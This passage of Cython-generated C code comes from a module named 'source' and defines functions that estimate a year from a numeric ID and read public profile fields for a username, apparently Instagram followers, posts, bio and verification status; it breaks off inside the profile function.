      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_r = __pyx_t_4;
      __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_8) {
      __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_7) < 0) __PYX_ERR(0, 575, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_INCREF(__pyx_kp_u_no_REST);
      __Pyx_XDECREF_SET(__pyx_v_r, __pyx_kp_u_no_REST);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_r);
  __pyx_r = __pyx_v_r;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_r);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_25date(PyObject *__pyx_self, PyObject *__pyx_v_hy); /*proto*/
static PyMethodDef __pyx_mdef_6source_25date = {"date", (PyCFunction)__pyx_pw_6source_25date, METH_O, 0};
static PyObject *__pyx_pw_6source_25date(PyObject *__pyx_self, PyObject *__pyx_v_hy) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("date (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_24date(__pyx_self, ((PyObject *)__pyx_v_hy));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_24date(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_hy) {
  PyObject *__pyx_v_ranges = NULL;
  PyObject *__pyx_v_upper = NULL;
  PyObject *__pyx_v_year = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *(*__pyx_t_10)(PyObject *);
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("date", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = PyList_New(14); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 582, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_INCREF(__pyx_tuple__48);
      __Pyx_GIVEREF(__pyx_tuple__48);
      PyList_SET_ITEM(__pyx_t_4, 0, __pyx_tuple__48);
      __Pyx_INCREF(__pyx_tuple__49);
      __Pyx_GIVEREF(__pyx_tuple__49);
      PyList_SET_ITEM(__pyx_t_4, 1, __pyx_tuple__49);
      __Pyx_INCREF(__pyx_tuple__50);
      __Pyx_GIVEREF(__pyx_tuple__50);
      PyList_SET_ITEM(__pyx_t_4, 2, __pyx_tuple__50);
      __Pyx_INCREF(__pyx_tuple__51);
      __Pyx_GIVEREF(__pyx_tuple__51);
      PyList_SET_ITEM(__pyx_t_4, 3, __pyx_tuple__51);
      __Pyx_INCREF(__pyx_tuple__52);
      __Pyx_GIVEREF(__pyx_tuple__52);
      PyList_SET_ITEM(__pyx_t_4, 4, __pyx_tuple__52);
      __Pyx_INCREF(__pyx_tuple__53);
      __Pyx_GIVEREF(__pyx_tuple__53);
      PyList_SET_ITEM(__pyx_t_4, 5, __pyx_tuple__53);
      __Pyx_INCREF(__pyx_tuple__54);
      __Pyx_GIVEREF(__pyx_tuple__54);
      PyList_SET_ITEM(__pyx_t_4, 6, __pyx_tuple__54);
      __Pyx_INCREF(__pyx_tuple__55);
      __Pyx_GIVEREF(__pyx_tuple__55);
      PyList_SET_ITEM(__pyx_t_4, 7, __pyx_tuple__55);
      __Pyx_INCREF(__pyx_tuple__56);
      __Pyx_GIVEREF(__pyx_tuple__56);
      PyList_SET_ITEM(__pyx_t_4, 8, __pyx_tuple__56);
      __Pyx_INCREF(__pyx_tuple__57);
      __Pyx_GIVEREF(__pyx_tuple__57);
      PyList_SET_ITEM(__pyx_t_4, 9, __pyx_tuple__57);
      __Pyx_INCREF(__pyx_tuple__58);
      __Pyx_GIVEREF(__pyx_tuple__58);
      PyList_SET_ITEM(__pyx_t_4, 10, __pyx_tuple__58);
      __Pyx_INCREF(__pyx_tuple__59);
      __Pyx_GIVEREF(__pyx_tuple__59);
      PyList_SET_ITEM(__pyx_t_4, 11, __pyx_tuple__59);
      __Pyx_INCREF(__pyx_tuple__60);
      __Pyx_GIVEREF(__pyx_tuple__60);
      PyList_SET_ITEM(__pyx_t_4, 12, __pyx_tuple__60);
      __Pyx_INCREF(__pyx_tuple__61);
      __Pyx_GIVEREF(__pyx_tuple__61);
      PyList_SET_ITEM(__pyx_t_4, 13, __pyx_tuple__61);
      __pyx_v_ranges = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_v_ranges; __Pyx_INCREF(__pyx_t_4); __pyx_t_5 = 0;
      for (;;) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_4)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_6 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_5); __Pyx_INCREF(__pyx_t_6); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 600, __pyx_L3_error)
        #else
        __pyx_t_6 = PySequence_ITEM(__pyx_t_4, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        #endif
        if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
          PyObject* sequence = __pyx_t_6;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 600, __pyx_L3_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_7 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_8 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_7 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_8 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          #else
          __pyx_t_7 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 600, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_8 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 600, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          #endif
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 600, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_10 = Py_TYPE(__pyx_t_9)->tp_iternext;
          index = 0; __pyx_t_7 = __pyx_t_10(__pyx_t_9); if (unlikely(!__pyx_t_7)) goto __pyx_L11_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_7);
          index = 1; __pyx_t_8 = __pyx_t_10(__pyx_t_9); if (unlikely(!__pyx_t_8)) goto __pyx_L11_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_8);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_10(__pyx_t_9), 2) < 0) __PYX_ERR(0, 600, __pyx_L3_error)
          __pyx_t_10 = NULL;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          goto __pyx_L12_unpacking_done;
          __pyx_L11_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_10 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 600, __pyx_L3_error)
          __pyx_L12_unpacking_done:;
        }
        __Pyx_XDECREF_SET(__pyx_v_upper, __pyx_t_7);
        __pyx_t_7 = 0;
        __Pyx_XDECREF_SET(__pyx_v_year, __pyx_t_8);
        __pyx_t_8 = 0;

        
        __pyx_t_6 = PyObject_RichCompare(__pyx_v_hy, __pyx_v_upper, Py_LE); __Pyx_XGOTREF(__pyx_t_6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 601, __pyx_L3_error)
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_6); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 601, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (__pyx_t_11) {

          
          __Pyx_XDECREF(__pyx_r);
          __Pyx_INCREF(__pyx_v_year);
          __pyx_r = __pyx_v_year;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          goto __pyx_L7_try_return;

          
        }

        
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_int_2023);
      __pyx_r = __pyx_int_2023;
      goto __pyx_L7_try_return;

      
    }
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L7_try_return:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L0;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("source.date", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ranges);
  __Pyx_XDECREF(__pyx_v_upper);
  __Pyx_XDECREF(__pyx_v_year);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_27InfoAcc(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_27InfoAcc = {"InfoAcc", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_27InfoAcc, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_27InfoAcc(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_username = 0;
  PyObject *__pyx_v_gg = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("InfoAcc (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_username,&__pyx_n_s_gg,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_gg)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("InfoAcc", 1, 2, 2, 1); __PYX_ERR(0, 609, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "InfoAcc") < 0)) __PYX_ERR(0, 609, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_username = values[0];
    __pyx_v_gg = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("InfoAcc", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 609, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_26InfoAcc(__pyx_self, __pyx_v_username, __pyx_v_gg);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_26InfoAcc(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, PyObject *__pyx_v_gg) {
  PyObject *__pyx_v_rr = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_Id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_full_name = NULL;
  PyObject *__pyx_v_fows = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fowg = NULL;
  PyObject *__pyx_v_pp = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_isPraise = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_bio = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_is_verified = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_bizz = NULL;
  int __pyx_v_meta;
  PyObject *__pyx_v_ss = NULL;
  PyObject *__pyx_v_ff = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_t_11;
  Py_ssize_t __pyx_t_12;
  Py_UCS4 __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("InfoAcc", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_infoinsta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 612, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 612, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 612, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_v_username, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_5, 2+__pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 612, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_v_username, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_5, 2+__pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 612, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  {
    __pyx_t_6 = PyTuple_New(2+__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 612, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    if (__pyx_t_4) {
      __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_4); __pyx_t_4 = NULL;
    }
    __Pyx_INCREF(__pyx_v_username);
    __Pyx_GIVEREF(__pyx_v_username);
    PyTuple_SET_ITEM(__pyx_t_6, 0+__pyx_t_5, __pyx_v_username);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_5, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 612, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_rr = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 614, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 614, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_Id = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 615, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__63, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 615, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_full_name = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 616, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 616, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_fows = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__65, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_fowg = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_pp = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 619, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 619, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_isPraise = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_bio = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 621, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 621, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_is_verified = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 622, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 622, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_bizz = __pyx_t_3;
  __pyx_t_3 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_9);
    /*try:*/ {

      
      __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_v_fows); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 624, __pyx_L3_error)
      if (__pyx_t_11) {
      } else {
        __pyx_t_10 = __pyx_t_11;
        goto __pyx_L10_bool_binop_done;
      }
      __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_v_pp); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 624, __pyx_L3_error)
      __pyx_t_10 = __pyx_t_11;
      __pyx_L10_bool_binop_done:;
      if (__pyx_t_10) {

        
        __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_v_fows); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
